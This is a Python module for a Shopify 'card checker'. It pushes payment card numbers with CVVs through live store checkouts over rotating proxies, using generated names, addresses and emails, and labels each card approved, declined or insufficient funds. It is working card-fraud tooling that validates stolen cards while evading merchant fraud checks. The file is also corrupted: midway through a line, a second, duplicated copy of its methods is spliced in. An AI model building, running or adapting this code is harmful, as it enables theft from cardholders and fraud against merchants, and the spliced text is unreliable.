import time
import random
import re
import requests
from bs4 import BeautifulSoup
from typing import Tuple, Optional, Dict
from .models import CardData, Address, CheckResponse, Proxy
from .pools import pool_manager
from .config import settings
from data.loaders import generate_email, generate_address
from .auto_discover import discoverer

class ShopifyEngine:
    def __init__(self):
        self.session = requests.Session()
        self.stats = {
            "total_checks": 0,
            "successful": 0,
            "failed": 0
        }
        self.product_cache = {}
    
    def get_product_for_site(self, site_url: str) -> Tuple[Optional[str], Optional[str]]:
        """Get product path and price for a site (auto-discover if needed)"""
        # Check cache
        if site_url in self.product_cache:
            return self.product_cache[site_url]
        
        # Check if site already has product path in pool
        for site in pool_manager.sites:
            if site.store == site_url:
                if site.product and site.product != "/products/test":
                    self.product_cache[site_url] = (site.product, site.price)
                    return site.product, site.price
                break
        
        # Auto-discover
        result = discoverer.discover_product(site_url)
        if result and result.get('product_path'):
            product_path = result['product_path']
            price = result.get('price', '2.95 USD')
            self.product_cache[site_url] = (product_path, price)
            return product_path, price
        
        # Fallback
        self.product_cache[site_url] = ("/products/test", "2.95 USD")
        return "/products/test", "2.95 USD"
    
    def parse_proxy(self, proxy: Proxy) -> Dict:
        return {
            "http": f"http://{proxy.username}:{proxy.password}@{proxy.host}:{proxy.port}",
            "https": f"https://{proxy.username}:{proxy.password}@{proxy.host}:{proxy.port}"
        }
    
    def extract_token(self, html: str, pattern: str = None) -> Optional[str]:
        soup = BeautifulSoup(html, 'html.parser')
        
        names = ['authenticity_token', 'csrf_token', '_token']
        if pattern:
            names.insert(0, pattern)
        
        for name in names:
            elem = soup.find('input', {'name': name})
            if elem:
                return elem.get('value')
            
            elem = soup.find('meta', {'name': name})
            if elem:
                return elem.get('content')
        
        return None
    
    def analyze_response(self, response: requests.Response, 
                        session: requests.Session) -> Tuple[str, str, str]:
        text = ""
        try:
            if response.status_code in [302, 303]:
                redirect = response.headers.get('Location')
                if redirect:
                    r = session.get(redirect, timeout=5)
                    text = r.text.lower()
            else:
                text = response.text.lower()
        except:
            text = str(response.status_code)
        
        if "order placed" in text or "thank you" in text:
            return "ORDER_PLACED", "True", "True"
        elif "insufficient" in text:
            return "INSUFFICIENT_FUNDS", "False", "False"
        elif "declined" in text:
            return "DECLINED", "False", "False"
        elif "fraud" in text or "security" in text:
            return "FRAUD_DETECTED", "False", "False"
        elif "invalid" in text:
            return "INVALID_CARD", "False", "False"
        else:
            return "UNKNOWN_RESPONSE", "False", "False"
    
    def process_checkout(self, card_string: str, 
                         proxy_str: Optional[str] = None,
                         email: Optional[str] = None,
                         site_url: Optional[str] = None) -> Tuple[Optional[Dict], Optional[str]]:
        
        start_time = time.time()
        
        # Parse card
        parts = card_string.split('|')
        if len(parts) < 4:
            return None, "Invalid card format"
        
        card = CardData(
            number=parts[0].replace(" ", ""),
            month=parts[1].zfill(2),
            year=parts[2][-2:] if len(parts[2]) > 2 else parts[2].zfill(2),
            cvv=parts[3]
        )
        
        # Get site
        site = None
        if site_url:
            for s in pool_manager.sites:
                if site_url in s.store:
                    site = s
                    break
        
        if not site:
            site = pool_manager.get_site()
        
        if not site:
            return None, "No working sites available"
        
        # Get product for this site
        product_path, product_price = self.get_product_for_site(site.store)
        if product_price:
            site.price = product_price
        
        # Get proxy
        proxy = None
        if proxy_str:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                proxy = Proxy(
                    host=parts[0],
                    port=int(parts[1]),
                    username=parts[2],
                    password=parts[3]
                )
        
        if not proxy:
            proxy = pool_manager.get_proxy()
        
        if not proxy:
            return None, "No working proxies available"
        
        # Setup session
        session = requests.Session()
        session.proxies.update(self.parse_proxy(proxy))
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded"
        })
        
        try:
            # Get product page
            product_url = f"{site.store}{product_path}"
            resp = session.get(product_url, timeout=settings.TIMEOUT)
            if resp.status_code != 200:
                return None, f"Product page unavailable"
            
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # Find variant ID
            variant_id = None
            
            variant_input = soup.find('input', {'name': 'id'})
            if variant_input:
                variant_id = variant_input.get('value')
            
            if not variant_id:
                variant_select = soup.find('select', {'name': 'id'})
                if variant_select:
                    options = variant_select.find_all('option')
                    if options:
                        variant_id = options[0].get('value')
            
            if not variant_id:
                for script in soup.find_all('script'):
                    if script.string and 'variant_id' in script.string:
                        matches = re.findall(r'variant_id["\']?\s*:\s*["\']?(\d+)', script.string)
                        if matches:
                            variant_id = matches[0]
                            break
            
            if not variant_id:
                return None, "Variant ID not found"
            
            # Add to cart
            add_url = f"{site.store}/cart/add"
            add_data = {"id": variant_id, "quantity": 1}
            resp = session.post(add_url, data=add_data, timeout=settings.TIMEOUT)
            if resp.status_code not in [200, 302, 303]:
                return None, "Failed to add to cart"
            
            # Get checkout
            resp = session.get(f"{site.store}/checkout", timeout=settings.TIMEOUT)
            if resp.status_code != 200:
                return None, "Failed to reach checkout"
            
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            token = self.extract_token(resp.text)
            if not token:
                return None, "Authenticity token not found"
            
            address = generate_address()
            email_to_use = email or generate_email()
            
            shipping_data = {
                "authenticity_token": token,
                "checkout[email]": email_to_use,
                "checkout[shipping_address][first_name]": address.first_name,
                "checkout[shipping_address][last_name]": address.last_name,
                "checkout[shipping_address][address1]": address.address1,
                "checkout[shipping_address][city]": address.city,
                "checkout[shipping_address][province_code]": address.state,
                "checkout[shipping_address][zip]": address.zip,
                "checkout[shipping_address][country_code]": "US",
                "checkout[shipping_address][phone]": f"555-{random.randint(100,999)}-{random.randint(1000,9999)}"
            }
            
            resp = session.post(
                f"{site.store}/checkout",
                data=shipping_data,
                timeout=settings.TIMEOUT,
                allow_redirects=False
            )
            
            if resp.status_code not in [302, 303]:
                return None, "Shipping info failed"
            
            payment_url = resp.headers.get('Location')
            if not payment_url:
                return None, "Payment redirect not found"
            if not payment_url.startswith('http'):
                payment_url = site.store + payment_url
            
            resp = session.get(payment_url, timeout=settings.TIMEOUT)
            if resp.status_code != 200:
                return None, "Failed to reach payment"
            
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            payment_token_input = soup.find('input', {'name': 'payment[gateway_token]'})
            if not payment_token_input:
                return None, "Payment token not found"
            
            payment_token = payment_token_input.get('value')
            
            payment_data = {
                "authenticity_token": token,
                "payment[gateway_token]": payment_token,
                "payment[credit_card][number]": card.number,
                "payment[credit_card][month]": card.month,
                "payment[credit_card][year]": card.year,
                "payment[credit_card][verification_value]": card.cvv,
                "payment[credit_card][name]": f"{address.first_name} {address.last_name}"
            }
            
            resp = session.post(
                f"{site.store}/checkout/payment",
                data=payment_data,
                timeout=settings.TIMEOUT,
                allow_redirects=False
            )
            
            elapsed = round(time.time() - start_time, 1)
            
            status, charged, approved = self.analyze_response(resp, session)
            
            result = {
                "Response": status,
                "CC": f"{card.number}|{card.month}|{card.year}|{card.cvv}",
                "Price": site.price,
                "Gate": site.gateway,
                "Charged": charged,
                "Approved": approved,
                "Time": f"{elapsed}s",
                "Email": email_to_                return elem.get('value')
            
            elem = soup.find('meta', {'name': name})
            if elem:
                return elem.get('content')
        
        return None
    
    def analyze_response(self, response: requests.Response, 
                        session: requests.Session) -> Tuple[str, str, str]:
        text = ""
        try:
            if response.status_code in [302, 303]:
                redirect = response.headers.get('Location')
                if redirect:
                    r = session.get(redirect, timeout=5)
                    text = r.text.lower()
            else:
                text = response.text.lower()
        except:
            text = str(response.status_code)
        
        if "order placed" in text or "thank you" in text:
            return "ORDER_PLACED", "True", "True"
        elif "insufficient" in text:
            return "INSUFFICIENT_FUNDS", "False", "False"
        elif "declined" in text:
            return "DECLINED", "False", "False"
        elif "fraud" in text or "security" in text:
            return "FRAUD_DETECTED", "False", "False"
        elif "invalid" in text:
            return "INVALID_CARD", "False", "False"
        else:
            return "UNKNOWN_RESPONSE", "False", "False"
    
    def process_checkout(self, card_string: str, 
                         proxy_str: Optional[str] = None,
                         email: Optional[str] = None,
                         site_url: Optional[str] = None) -> Tuple[Optional[Dict], Optional[str]]:
        
        start_time = time.time()
        
        parts = card_string.split('|')
        if len(parts) < 4:
            return None, "Invalid card format"
        
        card = CardData(
            number=parts[0].replace(" ", ""),
            month=parts[1].zfill(2),
            year=parts[2][-2:] if len(parts[2]) > 2 else parts[2].zfill(2),
            cvv=parts[3]
        )
        
        site = None
        if site_url:
            for s in pool_manager.sites:
                if site_url in s.store:
                    site = s
                    break
        
        if not site:
            site = pool_manager.get_site()
        
        if not site:
            return None, "No working sites available"
        
        proxy = None
        if proxy_str:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                proxy = Proxy(
                    host=parts[0],
                    port=int(parts[1]),
                    username=parts[2],
                    password=parts[3]
                )
        
        if not proxy:
            proxy = pool_manager.get_proxy()
        
        if not proxy:
            return None, "No working proxies available"
        
        session = requests.Session()
        session.proxies.update(self.parse_proxy(proxy))
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded"
        })
        
        try:
            product_url = f"{site.store}{site.product}"
            resp = session.get(product_url, timeout=settings.TIMEOUT)
            if resp.status_code != 200:
                return None, "Product page unavailable"
            
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            variant_input = soup.find('input', {'name': 'id'})
            if not variant_input:
                return None, "Variant ID not found"
            
            variant_id = variant_input.get('value')
            
            add_url = f"{site.store}/cart/add"
            add_data = {"id": variant_id, "quantity": 1}
            resp = session.post(add_url, data=add_data, timeout=settings.TIMEOUT)
            if resp.status_code not in [200, 302, 303]:
                return None, "Failed to add to cart"
            
            resp = session.get(f"{site.store}/checkout", timeout=settings.TIMEOUT)
            if resp.status_code != 200:
                return None, "Failed to reach checkout"
            
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            token = self.extract_token(resp.text)
            if not token:
                return None, "Authenticity token not found"
            
            address = generate_address()
            email_to_use = email or generate_email()
            
            shipping_data = {
                "authenticity_token": token,
                "checkout[email]": email_to_use,
                "checkout[shipping_address][first_name]": address.first_name,
                "checkout[shipping_address][last_name]": address.last_name,
                "checkout[shipping_address][address1]": address.address1,
                "checkout[shipping_address][city]": address.city,
                "checkout[shipping_address][province_code]": address.state,
                "checkout[shipping_address][zip]": address.zip,
                "checkout[shipping_address][country_code]": "US",
                "checkout[shipping_address][phone]": f"555-{random.randint(100,999)}-{random.randint(1000,9999)}"
            }
            
            resp = session.post(
                f"{site.store}/checkout",
                data=shipping_data,
                timeout=settings.TIMEOUT,
                allow_redirects=False
            )
            
            if resp.status_code not in [302, 303]:
                return None, "Shipping info failed"
            
            payment_url = resp.headers.get('Location')
            if not payment_url:
                return None, "Payment redirect not found"
            if not payment_url.startswith('http'):
                payment_url = site.store + payment_url
            
            resp = session.get(payment_url, timeout=settings.TIMEOUT)
            if resp.status_code != 200:
                return None, "Failed to reach payment"
            
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            payment_token_input = soup.find('input', {'name': 'payment[gateway_token]'})
            if not payment_token_input:
                return None, "Payment token not found"
            
            payment_token = payment_token_input.get('value')
            
            payment_data = {
                "authenticity_token": token,
                "payment[gateway_token]": payment_token,
                "payment[credit_card][number]": card.number,
                "payment[credit_card][month]": card.month,
                "payment[credit_card][year]": card.year,
                "payment[credit_card][verification_value]": card.cvv,
                "payment[credit_card][name]": f"{address.first_name} {address.last_name}"
            }
            
            resp = session.post(
                f"{site.store}/checkout/payment",
                data=payment_data,
                timeout=settings.TIMEOUT,
                allow_redirects=False
            )
            
            elapsed = round(time.time() - start_time, 1)
            
            status, charged, approved = self.analyze_response(resp, session)
            
            result = {
                "Response": status,
                "CC": f"{card.number}|{card.month}|{card.year}|{card.cvv}",
                "Price": site.price,
                "Gate": site.gateway,
                "Charged": charged,
                "Approved": approved,
                "Time": f"{elapsed}s",
                "Email": email_to_use,
                "Store": site.store,
                "Proxy": proxy.string,
                "Address": address.dict()
            }
            
            return result, None
            
        except requests.exceptions.ProxyError:
            pool_manager.mark_proxy_failed(proxy.id)
            return None, "Proxy failed"
            
        except requests.exceptions.Timeout:
            return None, "Timeout"
            
        except Exception as e:
            return None, f"Error: {str(e)[:100]}"

engine = ShopifyEngine()
